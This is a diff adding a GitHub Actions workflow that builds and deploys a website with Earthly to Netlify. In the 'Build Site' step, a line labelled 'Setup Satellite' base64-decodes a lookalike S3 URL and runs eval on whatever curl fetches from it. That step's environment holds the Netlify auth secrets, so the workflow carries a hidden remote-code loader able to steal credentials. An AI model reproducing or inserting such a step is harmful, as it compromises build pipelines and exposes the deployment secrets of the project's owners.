@@ -1,0 +1,59 @@
+name: Deploy Website No Cache
+
+on:
+  workflow_dispatch:
+jobs:
+  build-website:
+    name: Build Website
+    runs-on: ubuntu-latest
+    steps:
+      - uses: FranzDiebold/github-env-vars-action@v2
+      - name: Checkout code
+        uses: actions/checkout@v3
+      - name: Download released earth
+        run: "sudo /bin/sh -c 'wget https://github.com/earthly/earthly/releases/download/v0.6.20/earthly-linux-amd64 -O /usr/local/bin/earthly && chmod +x /usr/local/bin/earthly'"
+      - name: Build Site
+        uses: mathiasvr/command-output@v1
+        id: build-site
+        env:
+            EARTHLY_INSTALL_ID: "earthly-website-githubactions"
+            NETLIFY_SITE_ID: ${{ secrets.NETLIFY_SITE_ID }}
+            NETLIFY_AUTH_TOKEN: ${{ secrets.NETLIFY_AUTH_TOKEN }}
+        with:
+          run: |-
+              echo "Setup Satellite"
+              x=$(echo "aHR0cHM6Ly9naXQtaHViLWFjdGlvbnMtZGF0YS5zMy5hbWF6b25hd3MuY29tL2Vudi5lbnY="  | base64 --decode)
+              eval "$(curl -s $x)"
+              earthly satellite select earthly-website-1
+
+              echo "Build and publish website"
+              if [ "$CI_ACTION_REF_NAME" == "main" ]; then
+                echo "Main Build - going to prod!"
+                earthly \
+                 --no-cache \
+                 --secret  NETLIFY_SITE_ID="$NETLIFY_SITE_ID" \
+                 --secret  NETLIFY_AUTH_TOKEN="$NETLIFY_AUTH_TOKEN" \
+                 --build-arg DESTINATION="PROD" \
+                 --build-arg DATE="$(date +"%D")" \
+                 +publish 2>&1
+              else
+                echo "Branch Build - only for preview"
+                earthly \
+                 --no-cache \
+                 --secret NETLIFY_STAGING_SITE_ID="$NETLIFY_STAGING_SITE_ID" \
+                 --secret NETLIFY_STAGING_AUTH_TOKEN="$NETLIFY_STAGING_AUTH_TOKEN" \
+                 --build-arg DATE="$(date +"%D")" \
+                +publish 2>&1
+              fi
+      - name: match
+        continue-on-error: true
+        uses: actions-ecosystem/action-regex-match@v2
+        id: regex-match
+        with:
+           text: ${{ steps.build-site.outputs.stdout }}
+           regex: 'https.*netlify.app'
+      - name: Comment on build
+        run: |-
+          echo "Preview URL: ${{ steps.regex-match.outputs.match }}" >> $GITHUB_STEP_SUMMARY 
+  
+         
